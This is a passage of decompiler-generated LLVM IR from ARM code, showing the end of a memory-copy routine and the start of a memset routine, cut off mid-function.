  %v9_fd94 = icmp eq i32 %v2_fdb8, %v2_fd90
  store i1 %v9_fd94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fd94, label %dec_label_pc_fe3c, label %dec_label_pc_fd9c

dec_label_pc_fd9c.loopexit:                       ; preds = %dec_label_pc_fe64
  store i1 %v7_fe6c, i1* %cpsr_z.global-to-local, align 1
  %v0_fd9c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_fd9c

dec_label_pc_fd9c:                                ; preds = %dec_label_pc_fd9c.loopexit, %dec_label_pc_fe5c, %dec_label_pc_fd8c
  %v2_fdac12 = phi i32 [ %v4_fe70, %dec_label_pc_fd9c.loopexit ], [ %v1_fe708, %dec_label_pc_fe5c ], [ %tmp21, %dec_label_pc_fd8c ]
  %v0_fd9c = phi i32 [ %v0_fd9c.pre, %dec_label_pc_fd9c.loopexit ], [ %v0_fe5c, %dec_label_pc_fe5c ], [ %v0_fd44, %dec_label_pc_fd8c ]
  %v2_fd9c = icmp eq i32 %v0_fd9c, 0
  store i1 %v2_fd9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd9c, label %dec_label_pc_fd74, label %dec_label_pc_fda4

dec_label_pc_fda4:                                ; preds = %dec_label_pc_fd9c, %dec_label_pc_fda4.dec_label_pc_fda4_crit_edge
  %v2_fdac = phi i32 [ %v5_fdac, %dec_label_pc_fda4.dec_label_pc_fda4_crit_edge ], [ %v2_fdac12, %dec_label_pc_fd9c ]
  %v0_fda8 = phi i32 [ %v0_fda8.pre, %dec_label_pc_fda4.dec_label_pc_fda4_crit_edge ], [ %v0_fd9c, %dec_label_pc_fd9c ]
  %v0_fda4 = load i32, i32* @r6, align 4
  %v1_fda4 = inttoptr i32 %v0_fda4 to i8*
  %v2_fda4 = load i8, i8* %v1_fda4, align 1
  %v5_fda4 = add i32 %v0_fda4, 1
  store i32 %v5_fda4, i32* @r6, align 4
  %v1_fda8 = add i32 %v0_fda8, -1
  store i32 %v1_fda8, i32* %ip.global-to-local, align 4
  %v7_fda8 = icmp eq i32 %v0_fda8, 1
  store i1 %v7_fda8, i1* %cpsr_z.global-to-local, align 1
  %v3_fdac = inttoptr i32 %v2_fdac to i8*
  store i8 %v2_fda4, i8* %v3_fdac, align 1
  %v4_fdac = load i32, i32* @r4, align 4
  %v5_fdac = add i32 %v4_fdac, 1
  store i32 %v5_fdac, i32* @r4, align 4
  %v0_fdb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fdb0, label %dec_label_pc_fd74, label %dec_label_pc_fda4.dec_label_pc_fda4_crit_edge

dec_label_pc_fda4.dec_label_pc_fda4_crit_edge:    ; preds = %dec_label_pc_fda4
  %v0_fda8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_fda4

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fd84
  store i32 %v2_fdb8, i32* %r2.global-to-local, align 4
  %v2_fdbc = urem i32 %tmp21, 4
  %v9_fdc0 = icmp eq i32 %v2_fdb8, %v2_fdbc
  store i1 %v9_fdc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fdc0, label %dec_label_pc_fde8, label %dec_label_pc_fdc8

dec_label_pc_fdc8.loopexit:                       ; preds = %dec_label_pc_fe24.dec_label_pc_fe24_crit_edge, %dec_label_pc_fe24.preheader
  %v7_fe2c.lcssa = phi i1 [ %v7_fe2c40, %dec_label_pc_fe24.preheader ], [ %v7_fe2c, %dec_label_pc_fe24.dec_label_pc_fe24_crit_edge ]
  store i1 %v7_fe2c.lcssa, i1* %cpsr_z.global-to-local, align 1
  %v0_fdc8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_fdc8

dec_label_pc_fdc8:                                ; preds = %dec_label_pc_fdc8.loopexit, %dec_label_pc_fe1c, %dec_label_pc_fdb8
  %v0_fdc8 = phi i32 [ %v0_fdc8.pre, %dec_label_pc_fdc8.loopexit ], [ %v0_fe1c, %dec_label_pc_fe1c ], [ %v0_fd44, %dec_label_pc_fdb8 ]
  %v2_fdc8 = icmp eq i32 %v0_fdc8, 0
  store i1 %v2_fdc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fdc8, label %dec_label_pc_fd74, label %dec_label_pc_fdd0

dec_label_pc_fdd0:                                ; preds = %dec_label_pc_fdc8, %dec_label_pc_fdd0.dec_label_pc_fdd0_crit_edge
  %v0_fdd0 = phi i32 [ %v0_fdd0.pre, %dec_label_pc_fdd0.dec_label_pc_fdd0_crit_edge ], [ %v0_fdc8, %dec_label_pc_fdc8 ]
  %v1_fdd0 = add i32 %v0_fdd0, -1
  store i32 %v1_fdd0, i32* %ip.global-to-local, align 4
  %v1_fdd4 = load i32, i32* @lr, align 4
  %v2_fdd4 = add i32 %v1_fdd4, %v1_fdd0
  %v3_fdd4 = inttoptr i32 %v2_fdd4 to i8*
  %v4_fdd4 = load i8, i8* %v3_fdd4, align 1
  %v2_fdd8 = icmp eq i32 %v1_fdd0, 0
  store i1 %v2_fdd8, i1* %cpsr_z.global-to-local, align 1
  %v3_fddc = load i32, i32* @r5, align 4
  %v4_fddc = add i32 %v3_fddc, %v1_fdd0
  %v5_fddc = inttoptr i32 %v4_fddc to i8*
  store i8 %v4_fdd4, i8* %v5_fddc, align 1
  %v0_fde0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fde0, label %dec_label_pc_fd74, label %dec_label_pc_fdd0.dec_label_pc_fdd0_crit_edge

dec_label_pc_fdd0.dec_label_pc_fdd0_crit_edge:    ; preds = %dec_label_pc_fdd0
  %v0_fdd0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_fdd0

dec_label_pc_fde8:                                ; preds = %dec_label_pc_fdb8
  %v1_fde8 = urem i32 %v3_fd60, 4
  %v2_fde8 = icmp eq i32 %v1_fde8, 0
  store i1 %v2_fde8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fde8, label %dec_label_pc_fe1c, label %dec_label_pc_fdf0

dec_label_pc_fdf0:                                ; preds = %dec_label_pc_fde8
  %v1_fdf0 = add i32 %v0_fd44, -1
  store i32 %v1_fdf0, i32* %ip.global-to-local, align 4
  %v2_fdf0 = icmp eq i32 %v0_fd44, 0
  %v7_fdf0 = icmp eq i32 %v0_fd44, 1
  store i1 %v7_fdf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fdf0, label %dec_label_pc_fd74, label %dec_label_pc_fe08.preheader

dec_label_pc_fe08.preheader:                      ; preds = %dec_label_pc_fdf0
  %v4_fdf4 = add i32 %v1_fdf0, %tmp21
  store i32 %v4_fdf4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fe08

dec_label_pc_fe00:                                ; preds = %dec_label_pc_fe08
  %v1_fe00 = add i32 %v0_fe1c.pre, -1
  store i32 %v1_fe00, i32* %ip.global-to-local, align 4
  %v2_fe00 = icmp eq i32 %v0_fe1c.pre, 0
  %v7_fe00 = icmp eq i32 %v0_fe1c.pre, 1
  store i1 %v7_fe00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fe00, label %dec_label_pc_fd74, label %dec_label_pc_fe00.dec_label_pc_fe08_crit_edge

dec_label_pc_fe00.dec_label_pc_fe08_crit_edge:    ; preds = %dec_label_pc_fe00
  %v1_fe08.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_fe08

dec_label_pc_fe08:                                ; preds = %dec_label_pc_fe00.dec_label_pc_fe08_crit_edge, %dec_label_pc_fe08.preheader
  %v0_fe0c = phi i32 [ %v4_fdf4, %dec_label_pc_fe08.preheader ], [ %v1_fe14, %dec_label_pc_fe00.dec_label_pc_fe08_crit_edge ]
  %v1_fe08 = phi i32 [ %arg2, %dec_label_pc_fe08.preheader ], [ %v1_fe08.pre, %dec_label_pc_fe00.dec_label_pc_fe08_crit_edge ]
  %v0_fe08 = phi i32 [ %v1_fdf0, %dec_label_pc_fe08.preheader ], [ %v1_fe00, %dec_label_pc_fe00.dec_label_pc_fe08_crit_edge ]
  %v2_fe08 = add i32 %v0_fe08, %v1_fe08
  %v3_fe08 = inttoptr i32 %v2_fe08 to i8*
  %v4_fe08 = load i8, i8* %v3_fe08, align 1
  %v1_fe0c = urem i32 %v0_fe0c, 4
  %v2_fe0c = icmp eq i32 %v1_fe0c, 0
  store i1 %v2_fe0c, i1* %cpsr_z.global-to-local, align 1
  %v3_fe10 = inttoptr i32 %v0_fe0c to i8*
  store i8 %v4_fe08, i8* %v3_fe10, align 1
  %v0_fe14 = load i32, i32* %r2.global-to-local, align 4
  %v1_fe14 = add i32 %v0_fe14, -1
  store i32 %v1_fe14, i32* %r2.global-to-local, align 4
  %v0_fe18 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_fe1c.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v0_fe18, label %dec_label_pc_fe1c, label %dec_label_pc_fe00

dec_label_pc_fe1c:                                ; preds = %dec_label_pc_fe08, %dec_label_pc_fde8
  %v0_fe1c = phi i32 [ %v0_fd44, %dec_label_pc_fde8 ], [ %v0_fe1c.pre, %dec_label_pc_fe08 ]
  %v7_fe1c = icmp eq i32 %v0_fe1c, 3
  store i1 %v7_fe1c, i1* %cpsr_z.global-to-local, align 1
  %tmp53 = icmp ult i32 %v0_fe1c, 4
  br i1 %tmp53, label %dec_label_pc_fdc8, label %dec_label_pc_fe24.preheader

dec_label_pc_fe24.preheader:                      ; preds = %dec_label_pc_fe1c
  %v1_fe2434 = add i32 %v0_fe1c, -4
  store i32 %v1_fe2434, i32* %ip.global-to-local, align 4
  %v1_fe2835 = load i32, i32* @lr, align 4
  %v2_fe2836 = add i32 %v1_fe2835, %v1_fe2434
  %v3_fe2837 = inttoptr i32 %v2_fe2836 to i32*
  %v4_fe2838 = load i32, i32* %v3_fe2837, align 4
  %v2_fe2c39 = icmp ugt i32 %v1_fe2434, 2
  %v7_fe2c40 = icmp eq i32 %v1_fe2434, 3
  %v2_fe3041 = load i32, i32* @r5, align 4
  %v3_fe3042 = add i32 %v2_fe3041, %v1_fe2434
  %v4_fe3043 = inttoptr i32 %v3_fe3042 to i32*
  store i32 %v4_fe2838, i32* %v4_fe3043, align 4
  %v2_fe3444 = xor i1 %v7_fe2c40, true
  %v3_fe3445 = and i1 %v2_fe2c39, %v2_fe3444
  br i1 %v3_fe3445, label %dec_label_pc_fe24.dec_label_pc_fe24_crit_edge, label %dec_label_pc_fdc8.loopexit

dec_label_pc_fe24.dec_label_pc_fe24_crit_edge:    ; preds = %dec_label_pc_fe24.preheader, %dec_label_pc_fe24.dec_label_pc_fe24_crit_edge
  %v0_fe24.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_fe24 = add i32 %v0_fe24.pre, -4
  store i32 %v1_fe24, i32* %ip.global-to-local, align 4
  %v1_fe28 = load i32, i32* @lr, align 4
  %v2_fe28 = add i32 %v1_fe28, %v1_fe24
  %v3_fe28 = inttoptr i32 %v2_fe28 to i32*
  %v4_fe28 = load i32, i32* %v3_fe28, align 4
  %v2_fe2c = icmp ugt i32 %v1_fe24, 2
  %v7_fe2c = icmp eq i32 %v1_fe24, 3
  %v2_fe30 = load i32, i32* @r5, align 4
  %v3_fe30 = add i32 %v2_fe30, %v1_fe24
  %v4_fe30 = inttoptr i32 %v3_fe30 to i32*
  store i32 %v4_fe28, i32* %v4_fe30, align 4
  %v2_fe34 = xor i1 %v7_fe2c, true
  %v3_fe34 = and i1 %v2_fe2c, %v2_fe34
  br i1 %v3_fe34, label %dec_label_pc_fe24.dec_label_pc_fe24_crit_edge, label %dec_label_pc_fdc8.loopexit

dec_label_pc_fe3c:                                ; preds = %dec_label_pc_fd8c
  %v2_fe3c = icmp eq i32 %v2_fdb8, 0
  store i1 %v2_fe3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fe3c, label %dec_label_pc_fe5c, label %dec_label_pc_fe44

dec_label_pc_fe44:                                ; preds = %dec_label_pc_fe3c, %dec_label_pc_fe4c
  %v2_fe50 = phi i32 [ %v5_fe50, %dec_label_pc_fe4c ], [ %tmp21, %dec_label_pc_fe3c ]
  %v0_fe44 = phi i32 [ %v0_fe5c.pre, %dec_label_pc_fe4c ], [ %v0_fd44, %dec_label_pc_fe3c ]
  %v1_fe44 = add i32 %v0_fe44, -1
  store i32 %v1_fe44, i32* %ip.global-to-local, align 4
  %v2_fe44 = icmp eq i32 %v0_fe44, 0
  %v7_fe44 = icmp eq i32 %v0_fe44, 1
  store i1 %v7_fe44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fe44, label %dec_label_pc_fd74, label %dec_label_pc_fe4c

dec_label_pc_fe4c:                                ; preds = %dec_label_pc_fe44
  %v0_fe4c = load i32, i32* @r6, align 4
  %v1_fe4c = inttoptr i32 %v0_fe4c to i8*
  %v2_fe4c = load i8, i8* %v1_fe4c, align 1
  %v5_fe4c = add i32 %v0_fe4c, 1
  store i32 %v5_fe4c, i32* @r6, align 4
  %v3_fe50 = inttoptr i32 %v2_fe50 to i8*
  store i8 %v2_fe4c, i8* %v3_fe50, align 1
  %v4_fe50 = load i32, i32* @r4, align 4
  %v5_fe50 = add i32 %v4_fe50, 1
  store i32 %v5_fe50, i32* @r4, align 4
  %v1_fe54 = urem i32 %v5_fe50, 4
  %v2_fe54 = icmp eq i32 %v1_fe54, 0
  store i1 %v2_fe54, i1* %cpsr_z.global-to-local, align 1
  %v0_fe5c.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_fe54, label %dec_label_pc_fe5c, label %dec_label_pc_fe44

dec_label_pc_fe5c:                                ; preds = %dec_label_pc_fe4c, %dec_label_pc_fe3c
  %v1_fe708 = phi i32 [ %tmp21, %dec_label_pc_fe3c ], [ %v5_fe50, %dec_label_pc_fe4c ]
  %v0_fe5c = phi i32 [ %v0_fd44, %dec_label_pc_fe3c ], [ %v0_fe5c.pre, %dec_label_pc_fe4c ]
  %v7_fe5c = icmp eq i32 %v0_fe5c, 3
  store i1 %v7_fe5c, i1* %cpsr_z.global-to-local, align 1
  %tmp54 = icmp ult i32 %v0_fe5c, 4
  br i1 %tmp54, label %dec_label_pc_fd9c, label %dec_label_pc_fe64

dec_label_pc_fe64:                                ; preds = %dec_label_pc_fe5c, %dec_label_pc_fe64.dec_label_pc_fe64_crit_edge
  %v1_fe70 = phi i32 [ %v4_fe70, %dec_label_pc_fe64.dec_label_pc_fe64_crit_edge ], [ %v1_fe708, %dec_label_pc_fe5c ]
  %v0_fe64 = phi i32 [ %v0_fe64.pre, %dec_label_pc_fe64.dec_label_pc_fe64_crit_edge ], [ %v0_fe5c, %dec_label_pc_fe5c ]
  %v1_fe64 = add i32 %v0_fe64, -4
  store i32 %v1_fe64, i32* %ip.global-to-local, align 4
  %v0_fe68 = load i32, i32* @r6, align 4
  %v1_fe68 = inttoptr i32 %v0_fe68 to i32*
  %v2_fe68 = load i32, i32* %v1_fe68, align 4
  %v4_fe68 = add i32 %v0_fe68, 4
  store i32 %v4_fe68, i32* @r6, align 4
  %v2_fe6c = icmp ugt i32 %v1_fe64, 2
  %v7_fe6c = icmp eq i32 %v1_fe64, 3
  %v2_fe70 = inttoptr i32 %v1_fe70 to i32*
  store i32 %v2_fe68, i32* %v2_fe70, align 4
  %v3_fe70 = load i32, i32* @r4, align 4
  %v4_fe70 = add i32 %v3_fe70, 4
  store i32 %v4_fe70, i32* @r4, align 4
  %v2_fe74 = xor i1 %v7_fe6c, true
  %v3_fe74 = and i1 %v2_fe6c, %v2_fe74
  br i1 %v3_fe74, label %dec_label_pc_fe64.dec_label_pc_fe64_crit_edge, label %dec_label_pc_fd9c.loopexit

dec_label_pc_fe64.dec_label_pc_fe64_crit_edge:    ; preds = %dec_label_pc_fe64
  %v0_fe64.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_fe64

; uselistorder directives
  uselistorder i32 %v4_fe70, { 2, 0, 1 }
  uselistorder i32 %v0_fe5c, { 1, 0, 3, 2 }
  uselistorder i32 %v5_fe50, { 1, 0, 3, 2 }
  uselistorder i32 %v0_fe44, { 0, 2, 1 }
  uselistorder i32 %v1_fe24, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_fe1c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_fe1c.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_fe14, { 1, 0 }
  uselistorder i32 %v0_fe0c, { 1, 0 }
  uselistorder i32 %v1_fdf0, { 1, 0, 2 }
  uselistorder i32 %v1_fdd0, { 0, 2, 1, 3 }
  uselistorder i32 %v5_fdac, { 1, 0 }
  uselistorder i32 %v2_fdb8, { 3, 1, 0, 2 }
  uselistorder i32 %v0_fd44, { 3, 0, 4, 7, 9, 8, 6, 10, 5, 1, 2, 11 }
  uselistorder i32 %tmp21, { 5, 2, 3, 0, 6, 1, 4, 8, 7, 9, 10 }
  uselistorder i32* %ip.global-to-local, { 1, 3, 4, 5, 8, 7, 0, 10, 9, 11, 12, 13, 6, 14, 15, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 5, 8, 9, 10, 11, 12, 22, 13, 14, 15, 16, 23, 17, 18, 19, 20, 21 }
  uselistorder i32 %arg2, { 2, 0, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i8* %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_fe64, { 1, 0 }
  uselistorder label %dec_label_pc_fe44, { 1, 0 }
  uselistorder label %dec_label_pc_fe24.dec_label_pc_fe24_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_fdd0, { 1, 0 }
  uselistorder label %dec_label_pc_fdc8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fda4, { 1, 0 }
  uselistorder label %dec_label_pc_fd9c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fd74, { 2, 0, 1, 4, 5, 3, 6, 8, 7 }
}

define i32 @memset() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_fe7c = load i32, i32* @r2, align 4
  store i32 %v0_fe7c, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fe7c = icmp eq i32 %v0_fe7c, 0
  store i1 %v2_fe7c, i1* %cpsr_z.global-to-local, align 1
  %v3_fe80 = load i32, i32* @r4, align 4
  store i32 %v3_fe80, i32* %stack_var_-20, align 4
  br i1 %v2_fe7c, label %dec_label_pc_ff90, label %dec_label_pc_fe88

dec_label_pc_fe88:                                ; preds = %entry
  %v0_fe88 = load i32, i32* @r1, align 4
  %v1_fe88 = urem i32 %v0_fe88, 256
  store i32 %v1_fe88, i32* @ip, align 4
  %v0_fe8c = load i32, i32* @r0, align 4
  %v2_fe8c = add i32 %v0_fe8c, %v0_fe7c
  store i32 %v2_fe8c, i32* @r2, align 4
  %v2_fe90 = icmp ne i32 %v0_fe7c, 1
  store i1 %v2_fe90, i1* %cpsr_c.global-to-local, align 1
  %v7_fe90 = icmp eq i32 %v0_fe7c, 2
  store i1 %v7_fe90, i1* %cpsr_z.global-to-local, align 1
  %v1_fe94 = trunc i32 %v0_fe88 to i8
  %v3_fe94 = add i32 %v2_fe8c, -1
  %v4_fe94 = inttoptr i32 %v3_fe94 to i8*
  store i8 %v1_fe94, i8* %v4_fe94, align 1
  %v0_fe98 = load i32, i32* @ip, align 4
  %v1_fe98 = trunc i32 %v0_fe98 to i8
  %v2_fe98 = load i32, i32* @r0, align 4
  %v3_fe98 = inttoptr i32 %v2_fe98 to i8*
  store i8 %v1_fe98, i8* %v3_fe98, align 1
  %v0_fe9c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_fe9c = load i1, i1* %cpsr_c.global-to-local, align 1
  %v2_fe9c = xor i1 %v1_fe9c, true
  %v3_fe9c = or i1 %v0_fe9c, %v2_fe9c
  br i1 %v3_fe9c, label %dec_label_pc_ff90, label %dec_label_pc_fea0

dec_label_pc_fea0:                                ; preds = %dec_label_pc_fe88
  %v0_fea0 = load i32, i32* @r3, align 4
  %v2_fea0 = icmp ugt i32 %v0_fea0, 5
  store i1 %v2_fea0, i1* %cpsr_c.global-to-local, align 1
  %v7_fea0 = icmp eq i32 %v0_fea0, 6
  store i1 %v7_fea0, i1* %cpsr_z.global-to-local, align 1
  %v0_fea4 = load i32, i32* @ip, align 4
  %v1_fea4 = trunc i32 %v0_fea4 to i8
  %v2_fea4 = load i32, i32* @r2, align 4
  %v3_fea4 = add i32 %v2_fea4, -2
  %v4_fea4 = inttoptr i32 %v3_fea4 to i8*
  store i8 %v1_fea4, i8* %v4_fea4, align 1
  %v0_fea8 = load i32, i32* @ip, align 4
  %v1_fea8 = trunc i32 %v0_fea8 to i8
  %v2_fea8 = load i32, i32* @r0, align 4
  %v3_fea8 = add i32 %v2_fea8, 1
  %v4_fea8 = inttoptr i32 %v3_fea8 to i8*
  store i8 %v1_fea8, i8* %v4_fea8, align 1
  %v0_feac = load i32, i32* @ip, align 4
  %v1_feac = trunc i32 %v0_feac to i8
  %v2_feac = load i32, i32* @r2, align 4
  %v3_feac = add i32 %v2_feac, -3
  %v4_feac = inttoptr i32 %v3_feac to i8*
  store i8 %v1_feac, i8* %v4_feac, align 1
  %v0_feb0 = load i32, i32* @ip, align 4
  %v1_feb0 = trunc i32 %v0_feb0 to i8
  %v2_feb0 = load i32, i32* @r0, align 4
  %v3_feb0 = add i32 %v2_feb0, 2
  %v4_feb0 = inttoptr i32 %v3_feb0 to i8*
  store i8 %v1_feb0, i8* %v4_feb0, align 1
  %v0_feb4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_feb4 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v2_feb4 = xor i1 %v1_feb4, true
  %v3_feb4 = or i1 %v0_feb4, %v2_feb4
  br i1 %v3_feb4, label %dec_label_pc_ff90, label %dec_label_pc_feb8

dec_label_pc_feb8:                                ; preds = %dec_label_pc_fea0
  %v0_feb8 = load i32, i32* @r3, align 4
  %v2_feb8 = icmp ugt i32 %v0_feb8, 7
  store i1 %v2_feb8, i1* %cpsr_c.global-to-local, align 1
  %v7_feb8 = icmp eq i32 %v0_feb8, 8
  store i1 %v7_feb8, i1* %cpsr_z.global-to-local, align 1
  %v0_febc = load i32, i32* @ip, align 4
  %v1_febc = trunc i32 %v0_febc to i8
  %v2_febc = load i32, i32* @r2, align 4
  %v3_febc = add i32 %v2_febc, -4
  %v4_febc = inttoptr i32 %v3_febc to i8*
  store i8 %v1_febc, i8* %v4_febc, align 1
  %v0_fec0 = load i32, i32* @ip, align 4
  %v1_fec0 = trunc i32 %v0_fec0 to i8
  %v2_fec0 = load i32, i32* @r0, align 4
  %v3_fec0 = add i32 %v2_fec0, 3
  %v4_fec0 = inttoptr i32 %v3_fec0 to i8*
  store i8 %v1_fec0, i8* %v4_fec0, align 1
  %v0_fec4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_fec4 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v2_fec4 = xor i1 %v1_fec4, true
  %v3_fec4 = or i1 %v0_fec4, %v2_fec4
  br i1 %v3_fec4, label %dec_label_pc_ff90, label %dec_label_pc_fec8

dec_label_pc_fec8:                                ; preds = %dec_label_pc_feb8
  %v0_fec8 = load i32, i32* @r0, align 4
  %v1_fec8 = sub i32 0, %v0_fec8
  %v1_fecc = urem i32 %v1_fec8, 4
  store i32 %v1_fecc, i32* @r1, align 4
  %v0_fed0 = load i32, i32* @ip, align 4
  %v2_fed4 = mul i32 %v0_fed0, 257
  store i32 %v2_fed4, i32* @r2, align 4
  %v1_fed8 = load i32, i32* @r3, align 4
  %v2_fed8 = sub i32 %v1_fed8, %v1_fecc
  %v1_fedc = and i32 %v2_fed8, -4
  store i32 %v1_fedc, i32* %lr.global-to-local, align 4
  %v2_fee0 = add i32 %v1_fecc, %v0_fec8
  store i32 %v2_fee0, i32* %r6.global-to-local, align 4
  %v3_fee4 = mul i32 %v0_fed0, 16842752
  store i32 %v3_fee4, i32* @r3, align 4
  %v2_fee8 = mul i32 %v0_fed0, 16843009
  store i32 %v2_fee8, i32* @ip, align 4
  %v2_feec = add i32 %v1_fedc, %v2_fee0
  store i32 %v2_feec, i32* %r5.global-to-local, align 4
  %v2_fef0 = icmp ugt i32 %v1_fedc, 7
  store i1 %v2_fef0, i1* %cpsr_c.global-to-local, align 1
  %v7_fef0 = icmp eq i32 %v1_fedc, 8
  store i1 %v7_fef0, i1* %cpsr_z.global-to-local, align 1
  %v4_fef4 = inttoptr i32 %v2_fee0 to i32*
  store i32 %v2_fee8, i32* %v4_fef4, align 4
  %v0_fef8 = load i32, i32* @ip, align 4
  %v1_fef8 = load i32, i32* %r5.global-to-local, align 4
  %v2_fef8 = add i32 %v1_fef8, -4
  %v3_fef8 = inttoptr i32 %v2_fef8 to i32*
  store i32 %v0_fef8, i32* %v3_fef8, align 4
  %v2_fefc = xor i1 %v2_fef0, true
  %v3_fefc = or i1 %v7_fef0, %v2_fefc
  br i1 %v3_fefc, label %dec_label_pc_ff90, label %dec_label_pc_ff00

dec_label_pc_ff00:                                ; preds = %dec_label_pc_fec8
  %v0_ff00 = load i32, i32* %lr.global-to-local, align 4
  %v2_ff00 = icmp ugt i32 %v0_ff00, 23
  store i1 %v2_ff00, i1* %cpsr_c.global-to-local, align 1
  %v7_ff00 = icmp eq i32 %v0_ff00, 24
  store i1 %v7_ff00, i1* %cpsr_z.global-to-local, align 1
  %v0_ff04 = load i32, i32* @ip, align 4
  %v1_ff04 = load i32, i32* %r6.global-to-local, align 4
  %v2_ff04 = add i32 %v1_ff04, 4
  %v3_ff04 = inttoptr i32 %v2_ff04 to i32*
  store i32 %v0_ff04, i32* %v3_ff04, align 4
  %v0_ff08 = load i32, i32* @ip, align 4
  %v1_ff08 = load i32, i32* %r6.global-to-local, align 4
  %v2_ff08 = add i32 %v1_ff08, 8
  %v3_ff08 = inttoptr i32 %v2_ff08 to i32*
  store i32 %v0_ff08, i32* %v3_ff08, align 4
  %v0_ff0c = load i32, i32* @ip, align 4
  %v1_ff0c = load i32, i32* %r5.global-to-local, align 4
  %v2_ff0c = add i32 %v1_ff0c, -12
  %v3_ff0c = inttoptr i32 %v2_ff0c to i32*
  store i32 %v0_ff0c, i32* %v3_ff0c, align 4
  %v0_ff10 = load i32, i32* @ip, align 4
  %v1_ff10 = load i32, i32* %r5.global-to-local, align 4
  %v2_ff10 = add i32 %v1_ff10, -8
  %v3_ff10 = inttoptr i32 %v2_ff10 to i32*
  store i32 %v0_ff10, i32* %v3_ff10, align 4
  %v2_ff14 = xor i1 %v2_ff00, true
  %v3_ff14 = or i1 %v7_ff00, %v2_ff14
  br i1 %v3_ff14, label %dec_label_pc_ff90, label %dec_label_pc_ff18

dec_label_pc_ff18:                                ; preds = %dec_label_pc_ff00
  %v0_ff18 = load i32, i32* %r6.global-to-local, align 4
  %v1_ff18 = and i32 %v0_ff18, 4
  %v1_ff1c = or i32 %v1_ff18, 24
  store i32 %v1_ff1c, i32* %r7.global-to-local, align 4
  %v1_ff20 = load i32, i32* %lr.global-to-local, align 4
  %v2_ff20 = sub i32 %v1_ff20, %v1_ff1c
  store i32 %v2_ff20, i32* %lr.global-to-local, align 4
  %v0_ff24 = load i32, i32* @ip, align 4
  store i32 %v0_ff24, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ff30 = icmp ugt i32 %v2_ff20, 30
  store i1 %v2_ff30, i1* %cpsr_c.global-to-local, align 1
  %v7_ff30 = icmp eq i32 %v2_ff20, 31
  store i1 %v7_ff30, i1* %cpsr_z.global-to-local, align 1
  %v2_ff34 = add i32 %v0_ff18, 12
  %v3_ff34 = inttoptr i32 %v2_ff34 to i32*
  store i32 %v0_ff24, i32* %v3_ff34, align 4
  %v0_ff38 = load i32, i32* @ip, align 4
  %v1_ff38 = load i32, i32* %r6.global-to-local, align 4
  %v2_ff38 = add i32 %v1_ff38, 16
  %v3_ff38 = inttoptr i32 %v2_ff38 to i32*
  store i32 %v0_ff38, i32* %v3_ff38, align 4
  %v0_ff3c = load i32, i32* @ip, align 4
  %v1_ff3c = load i32, i32* %r6.global-to-local, align 4
  %v2_ff3c = add i32 %v1_ff3c, 20
  %v3_ff3c = inttoptr i32 %v2_ff3c to i32*
  store i32 %v0_ff3c, i32* %v3_ff3c, align 4
  %v0_ff40 = load i32, i32* @ip, align 4
  %v1_ff40 = load i32, i32* %r6.global-to-local, align 4
  %v2_ff40 = add i32 %v1_ff40, 24
  %v3_ff40 = inttoptr i32 %v2_ff40 to i32*
  store i32 %v0_ff40, i32* %v3_ff40, align 4
  %v0_ff44 = load i32, i32* %r3.global-to-local, align 4
  %v1_ff44 = load i32, i32* @r1, align 4
  %v2_ff44 = or i32 %v1_ff44, %v0_ff44
  store i32 %v2_ff44, i32* @r3, align 4
  %v1_ff48 = load i32, i32* @r2, align 4
  %v2_ff48 = or i32 %v1_ff48, %v1_ff44
  store i32 %v2_ff48, i32* %r4.global-to-local, align 4
  %v0_ff4c = load i32, i32* @ip, align 4
  %v1_ff4c = load i32, i32* %r5.global-to-local, align 4
  %v2_ff4c = add i32 %v1_ff4c, -16
  %v3_ff4c = inttoptr i32 %v2_ff4c to i32*
  store i32 %v0_ff4c, i32* %v3_ff4c, align 4
  %v0_ff50 = load i32, i32* @ip, align 4
